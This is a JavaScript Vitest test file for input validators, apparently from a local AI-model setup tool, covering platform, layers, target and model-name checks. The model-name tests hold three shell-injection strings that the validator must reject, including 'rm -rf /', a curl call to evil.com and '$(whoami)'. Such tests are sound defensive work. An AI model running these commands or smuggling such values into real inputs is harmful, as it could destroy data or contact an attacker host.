import { describe, it, expect } from 'vitest';
import { validatePlatform, validateLayers, validateTarget, validateModelName } from '../src/validate.js';

describe('validate', () => {
  describe('validatePlatform()', () => {
    it('accepts valid platforms', () => {
      expect(() => validatePlatform({ os: 'darwin' })).not.toThrow();
      expect(() => validatePlatform({ os: 'win32' })).not.toThrow();
      expect(() => validatePlatform({ os: 'linux' })).not.toThrow();
    });

    it('rejects null/undefined', () => {
      expect(() => validatePlatform(null)).toThrow(TypeError);
      expect(() => validatePlatform(undefined)).toThrow(TypeError);
    });

    it('rejects invalid OS', () => {
      expect(() => validatePlatform({ os: 'freebsd' })).toThrow();
    });
  });

  describe('validateLayers()', () => {
    it('accepts valid layers object', () => {
      expect(() => validateLayers({ browser: true })).not.toThrow();
    });

    it('rejects non-objects', () => {
      expect(() => validateLayers(null)).toThrow(TypeError);
      expect(() => validateLayers('string')).toThrow(TypeError);
    });
  });

  describe('validateTarget()', () => {
    it('accepts valid targets', () => {
      expect(() => validateTarget('desktop')).not.toThrow();
      expect(() => validateTarget('code')).not.toThrow();
      expect(() => validateTarget('both')).not.toThrow();
      expect(() => validateTarget('skip')).not.toThrow();
    });

    it('rejects invalid targets', () => {
      expect(() => validateTarget('invalid')).toThrow();
    });
  });

  describe('validateModelName()', () => {
    it('accepts valid model names', () => {
      expect(() => validateModelName('qwen2.5:7b')).not.toThrow();
      expect(() => validateModelName('llava:7b')).not.toThrow();
      expect(() => validateModelName('deepseek/coder-v2')).not.toThrow();
    });

    it('rejects shell injection attempts', () => {
      expect(() => validateModelName('qwen; rm -rf /')).toThrow();
      expect(() => validateModelName('model && curl evil.com')).toThrow();
      expect(() => validateModelName('$(whoami)')).toThrow();
    });
  });
});
